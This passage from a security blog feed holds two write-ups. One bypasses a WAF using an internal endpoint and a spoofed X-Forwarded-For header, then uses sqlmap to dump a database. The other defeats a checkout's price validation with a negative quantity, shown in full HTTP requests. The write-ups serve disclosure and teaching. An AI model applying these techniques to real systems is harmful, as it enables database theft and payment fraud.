+&lt;h2 id=&quot;crawl-and-audit-&quot;&gt;Crawl and Audit 🪲&lt;/h2&gt;
+&lt;p&gt;I created an account and thoroughly tested all the features, but couldn’t find any vulnerabilities. To dig deeper, I utilized a custom tool I developed to identify embedded locations and URLs within the application. By enumerating all the pages and analyzing the embedded locations, I hoped to discover potential vulnerabilities, particularly SQL and cross-site scripting (XSS) injection points.&lt;/p&gt;
+
+&lt;h2 id=&quot;sql-injection-&quot;&gt;SQL Injection 💉&lt;/h2&gt;
+&lt;p&gt;After scrutinizing hundreds of requests and thousands of input fields, I identified a suspicious parameter named &lt;strong&gt;request_module&lt;/strong&gt;. This parameter appears to be generated by the application’s underlying framework, although I couldn’t determine which framework it is. Using an automated tool called &lt;strong&gt;sqmap&lt;/strong&gt;, I detected a potential Boolean-based SQL injection vulnerability.&lt;/p&gt;
+
+&lt;h3 id=&quot;waf️&quot;&gt;WAF🛡️&lt;/h3&gt;
+&lt;p&gt;Since the application employs a web application firewall, all of my injection payloads were rejected with a 400 Bad Request response. After a while, my IP address was blocked for 15 minutes.&lt;/p&gt;
+
+&lt;p&gt;Feeling discouraged, I decided to examine the requests further. I discovered that in one endpoint, the application sends a POST request to a page where users can create HTML content to be published to their customers.&lt;/p&gt;
+
+&lt;h3 id=&quot;request&quot;&gt;Request&lt;/h3&gt;
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/api/v1/promo_offers&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;www.target.com&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;blah...blah...blah...&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Language&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;en-US,en;q=0.5&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gzip, deflate&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Referer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https://www.target.com/&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Sec-Fetch-Dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;iframe&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Sec-Fetch-Mode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;navigate&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Sec-Fetch-Site&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cross-site&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Te&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;trailers&lt;/span&gt;
+
+{
+  &quot;Title&quot;: &quot;Promo1&quot;,
+  &quot;Content&quot;: &quot;&amp;lt;h2&amp;gt;This is a wonderful offer&amp;lt;/h2&amp;gt;&amp;lt;p&amp;gt;Hurry up to get the best deals out of it...&amp;lt;/p&amp;gt;&quot;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In the above request, the application publishes HTML content. The input validation for this page allows only whitelisted HTML tags and content.&lt;/p&gt;
+
+&lt;p&gt;While reviewing the requests again, I came across an internal request that was likely meant for testing purposes but was unintentionally left in the production code.&lt;/p&gt;
+
+&lt;h3 id=&quot;internal-request&quot;&gt;Internal Request&lt;/h3&gt;
+
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/internal/api/v1/promo_offers&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;www.target.com&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-Forwarded-For&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;localhost:4563&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;blah...blah...blah...&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Language&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;en-US,en;q=0.5&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gzip, deflate&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Referer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https://www.target.com/&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Sec-Fetch-Dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;iframe&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Sec-Fetch-Mode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;navigate&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Sec-Fetch-Site&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cross-site&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Te&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;trailers&lt;/span&gt;
+
+{
+  &quot;Title&quot;: &quot;Promo1&quot;,
+  &quot;Content&quot;: &quot;&amp;lt;h2&amp;gt;This is a wonderful offer&amp;lt;/h2&amp;gt;&amp;lt;p&amp;gt;Hurry up to get the best deals out of it...&amp;lt;/p&amp;gt;&quot;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The API endpoint directory location begins with &lt;strong&gt;internal&lt;/strong&gt;, and it shares the same POST request as before, with the addition of the &lt;strong&gt;X-Forwarded-For: localhost:4563&lt;/strong&gt; header.&lt;/p&gt;
+
+&lt;p&gt;When I sent the request, it responded with a &lt;strong&gt;200 OK&lt;/strong&gt; response. Consequently, I modified the payload from HTML to various SQL injection payloads, but the response remained 200 OK, suggesting no exploitable vulnerabilities.&lt;/p&gt;
+
+&lt;h3 id=&quot;bypass-&quot;&gt;Bypass 💉&lt;/h3&gt;
+&lt;p&gt;Considering the suspicious nature of the &lt;strong&gt;request_module&lt;/strong&gt; parameter, I configured the &lt;strong&gt;X-Forwarded-For: localhost:4563&lt;/strong&gt; header in the request containing the &lt;strong&gt;request_module&lt;/strong&gt; parameter. I then automated this request using &lt;strong&gt;sqlmap&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h4 id=&quot;automated-process-using-sqlmap&quot;&gt;Automated Process using Sqlmap&lt;/h4&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/blogs/sqli2/1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;confirming-vulnerability&quot;&gt;Confirming Vulnerability&lt;/h4&gt;
+
+&lt;p&gt;By increasing the risk level to 3 and 4, sqlmap identified that the &lt;strong&gt;request_module&lt;/strong&gt; parameter is vulnerable to a Boolean-based SQL injection attack.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/blogs/sqli2/2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;enumerating-the-database&quot;&gt;Enumerating the Database&lt;/h4&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/blogs/sqli2/3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;available-databases&quot;&gt;Available Databases&lt;/h4&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/blogs/sqli2/4.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The scanning process took approximately an hour, during which all the databases were enumerated. I then proceeded to dump the entire database.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; &lt;em&gt;To expedite the table enumeration process, increase the number of threads.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Thank you for reading!&lt;/p&gt;
+
+&lt;p&gt;For more insights and updates, follow me on Twitter: &lt;a href=&quot;https://twitter.com/thevillagehackr&quot;&gt;@thevillagehacker&lt;/a&gt;.&lt;/p&gt;</content><author><name>Naveen</name></author><category term="blog" /><category term="Web Application Firewall" /><category term="Bypass Techniques" /><category term="SQL Injection" /><summary type="html">Target Background</summary></entry><entry><title type="html">Exploiting Business Logic Error: Price Manipulation</title><link href="http://localhost:4000/Business_logic_error/" rel="alternate" type="text/html" title="Exploiting Business Logic Error: Price Manipulation" /><published>2023-04-12T12:00:00+05:30</published><updated>2023-04-12T12:00:00+05:30</updated><id>http://localhost:4000/Business_logic_error</id><content type="html" xml:base="http://localhost:4000/Business_logic_error/">&lt;h1 id=&quot;target-background&quot;&gt;Target Background&lt;/h1&gt;
+&lt;p&gt;The target of this analysis is a web application functioning as an e-commerce platform. It facilitates online purchases of various products and services by users.&lt;/p&gt;
+
+&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
+&lt;p&gt;The Target company previously disclosed a vulnerability report regarding a specific issue: “hackers were able to manipulate the payment amount during the checkout/order process.” To understand the application’s fix for this vulnerability, I attempted the same steps to examine the implemented validation mechanisms.&lt;/p&gt;
+
+&lt;h2 id=&quot;reconnaissance&quot;&gt;Reconnaissance&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Hosted on AWS&lt;/li&gt;
+  &lt;li&gt;Utilizes React for web application development&lt;/li&gt;
+  &lt;li&gt;Mobile application version is also available&lt;/li&gt;
+  &lt;li&gt;All application requests and responses are encrypted&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;finding-the-encryption-key&quot;&gt;Finding the Encryption Key&lt;/h2&gt;
+&lt;p&gt;Upon inspecting the application traffic, I discovered that the JSON payloads in requests and responses were encrypted. To manipulate or interact with these encrypted payloads, I needed to locate the encryption and decryption keys.&lt;/p&gt;
+
+&lt;p&gt;During my analysis of the JavaScript files, I identified the encryption key, the encryption algorithm, the mode, and the initialization vector. Armed with this information, I used online encryption tools to encrypt the payloads.&lt;/p&gt;
+
+&lt;h2 id=&quot;playing-with-fire&quot;&gt;Playing with fire🔥&lt;/h2&gt;
+&lt;p&gt;I attempted to modify the price parameter in the request, but the application’s validation mechanism prevented any successful manipulation. The amount to be paid was validated against a salted hash that was associated with the purchase order.&lt;/p&gt;
+
+&lt;h3 id=&quot;actual-request-and-response&quot;&gt;Actual Request and Response&lt;/h3&gt;
+
+&lt;h3 id=&quot;request&quot;&gt;Request&lt;/h3&gt;
+
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/api/v1/checkout&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;www.target.com&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;blah...blah...blah...&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Language&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;en-US,en;q=0.5&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gzip, deflate&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Referer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https://www.target.com/&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Sec-Fetch-Dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;iframe&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Sec-Fetch-Mode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;navigate&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Sec-Fetch-Site&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cross-site&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Te&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;trailers&lt;/span&gt;
+
+{
+  &quot;saltedhash&quot;: &quot;hashcode&quot;,
+  &quot;product_id&quot;: &quot;121212&quot;,
+  &quot;price&quot;: &quot;10&quot;,
+  &quot;quantity&quot;: &quot;10&quot;,
+  &quot;address&quot;: &quot;ABC city, ABC.&quot;,
+  &quot;zipcode&quot;: &quot;123456&quot;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;response&quot;&gt;Response&lt;/h3&gt;
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;OK &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Access-Control-Allow-Origin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;* &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/json; charset=utf-8 &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Set-Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;blah...blah...blah...; Path=/; HttpOnly &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-Frame-Options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;SAMEORIGIN &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-Content-Type-Options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;nosniff &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-XSS-Protection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1; mode=block &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Referrer-Policy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;strict-origin-when-cross-origin &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Strict-Transport-Security&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;max-age=31536000; includeSubDomains&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;saltedhash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;hashcode&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;product_id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;121212&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;price&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;10&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;quantity&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;10&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;amount_to_be_paid&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;100&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;address&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ABC city, ABC.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;zipcode&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;123456&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The above request represents a checkout request sent to the server to facilitate payment for a purchase order. To address the previously exploited price manipulation vulnerability, the developer implemented an additional parameter named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;saltedhash&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;bypass&quot;&gt;Bypass&lt;/h2&gt;
+&lt;p&gt;During my exploration of the application flow and requests, I decided to conduct a deeper investigation of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;checkout&lt;/code&gt; request. I noticed a parameter called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;quantity&lt;/code&gt;, which was responsible for creating orders based on the desired quantity specified by customers. I attempted to modify this value to a negative number.&lt;/p&gt;
+
+&lt;h3 id=&quot;manipulated-request&quot;&gt;Manipulated Request&lt;/h3&gt;
+
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/api/v1/checkout&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;www.target.com&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;blah...blah...blah...&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Language&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;en-US,en;q=0.5&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gzip, deflate&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Referer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https://www.target.com/&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Sec-Fetch-Dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;iframe&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Sec-Fetch-Mode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;navigate&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Sec-Fetch-Site&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cross-site&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Te&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;trailers&lt;/span&gt;
+
+{
+  &quot;saltedhash&quot;: &quot;hashcode&quot;,
+  &quot;product_id&quot;: &quot;121212&quot;,
+  &quot;price&quot;: &quot;10&quot;,
+  &quot;quantity&quot;: &quot;-5&quot;,
+  &quot;address&quot;: &quot;ABC city, ABC.&quot;,
+  &quot;zipcode&quot;: &quot;123456&quot;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Upon sending the request with a negative value for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;quantity&lt;/code&gt; parameter, the server responded by adjusting the amount to be paid accordingly. The lack of validation on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;quantity&lt;/code&gt; parameter allowed negative values to be accepted. As a result, the backend calculation for the amount to be paid was based on the per-quantity price and the number of quantities in the cart.&lt;/p&gt;
+
+&lt;h3 id=&quot;response-1&quot;&gt;Response&lt;/h3&gt;
+
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;OK &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Access-Control-Allow-Origin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;* &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/json; charset=utf-8 &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Set-Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;blah...blah...blah...; Path=/; HttpOnly &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-Frame-Options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;SAMEORIGIN &lt;/span&gt;
